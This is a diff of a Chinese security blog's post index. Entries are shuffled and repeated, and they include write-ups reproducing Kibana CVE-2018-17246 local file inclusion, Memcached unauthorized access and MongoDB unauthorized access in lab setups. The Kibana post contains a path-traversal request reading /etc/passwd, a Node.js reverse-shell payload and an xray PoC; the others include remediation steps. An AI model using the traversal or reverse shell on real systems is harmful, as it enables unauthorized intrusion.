-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">
-
-
-
-<p>进入kibana控制台命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">
-
-
-
-<p>可以看到复制文件成功</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">
-
-
-
-<p>在浏览器中访问创建的shell.js文件</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">
-
-
-
-<p>文件包含成功，js语句执行成功，反弹shell</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">
-
-
-
-<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
-<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web应用漏洞</category>
-        <category>Kibana</category>
-      </categories>
-      <tags>
-        <tag>-web应用漏洞 - Kibana -命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java反射机制</title>
     <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
@@ -1075,78 +1278,104 @@
       </tags>
   </entry>
   <entry>
-    <title>Memcached 未授权访问漏洞</title>
-    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
-<p>(2) 风险等级高风险。</p>
-<p>(3) 漏洞编号CVE-2013-7239 。</p>
-<p>(4) 影响范围Memcached 全版本。</p>
-<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
+    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
+    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
+    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>FreeBSD</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
+<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>安装完后可以使用 whereis 查看命令的路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
+<p>Fofa:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>安装完成后，启动Mecached</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 
 
-<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
+<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">
 
 
 
-<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
+<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>可以看到服务器响应500</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">
 
 
 
-<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>
+
+<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">
 
 
 
-<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
+<p>js代码如下:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
 
 
 
-<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">
 
 
 
-<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
+<p>进入kibana控制台命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">
+
+
+
+<p>可以看到复制文件成功</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">
+
+
+
+<p>在浏览器中访问创建的shell.js文件</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">
+
+
+
+<p>文件包含成功，js语句执行成功，反弹shell</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">
+
+
+
+<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
+<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>Web漏洞</category>
-        <category>未授权访问</category>
+        <category>Web应用漏洞</category>
+        <category>Kibana</category>
       </categories>
       <tags>
-        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
+        <tag>-web应用漏洞 - Kibana -命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -1394,97 +1623,78 @@
       </tags>
   </entry>
   <entry>
-    <title>MongoDB未授权访问漏洞</title>
-    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
-<p>安装前先安装依赖包</p>
-<p><strong>Red Hat&#x2F;CentOS：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
+    <title>Memcached 未授权访问漏洞</title>
+    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
+<p>(2) 风险等级高风险。</p>
+<p>(3) 漏洞编号CVE-2013-7239 。</p>
+<p>(4) 影响范围Memcached 全版本。</p>
+<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
 
 
 
-<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
+<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>FreeBSD</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
 
 
 
-<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
+<p>安装完后可以使用 whereis 查看命令的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
 
 
 
-<p>下载MongoDB</p>
-<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
+<p>安装完成后，启动Mecached</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
 
 
 
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
-
-<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
+<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
 
 
 
-<p>创建数据库目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
+<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
 
 
 
-<p>创建数据库存放目录和日志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
 
 
 
-<p>命令行中启动MongoDB服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
+<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<p>Mongodb启动成功</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
+<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
+<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
-
-
-
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
-<p>① MongoDB 启动时添加 -auth 参数。</p>
-<p>② 给 MongoDB 添加用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(2) 禁用 HTTP 和 REST 端口</p>
-<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(3) 限制绑定 IP</p>
-<p>启动时加入参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
-
+<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
 ]]></content>
       <categories>
         <category>Web漏洞</category>
         <category>未授权访问</category>
       </categories>
       <tags>
-        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
+        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
       </tags>
   </entry>
   <entry>
@@ -1721,6 +1931,100 @@
       </categories>
       <tags>
         <tag>-内网渗透 -工具使用 -免杀处理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MongoDB未授权访问漏洞</title>
+    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
+<p>安装前先安装依赖包</p>
+<p><strong>Red Hat&#x2F;CentOS：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
